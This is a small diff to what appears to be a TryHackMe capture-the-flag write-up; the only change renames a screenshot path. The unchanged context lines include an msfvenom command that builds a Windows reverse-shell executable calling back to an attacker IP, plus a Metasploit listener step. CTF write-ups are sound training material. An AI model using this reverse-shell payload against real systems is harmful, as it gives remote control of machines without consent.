@@ -116,7 +116,7 @@ Then we get the file contents: `Get-Content 'C:\Users\jack\Documents\flagdll.txt
 
 `THM-636729273483` - The room gives us an example payload to create a file to upload to the system. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.68.77 LPORT=4444 -f exe > common.exe`
 
-![](<../../../.gitbook/assets/image (111).png>)
+![](<../../../.gitbook/assets/image (111) (1).png>)
 
 Now we start metasploit and get our listener ready `msfconsole -q`
 
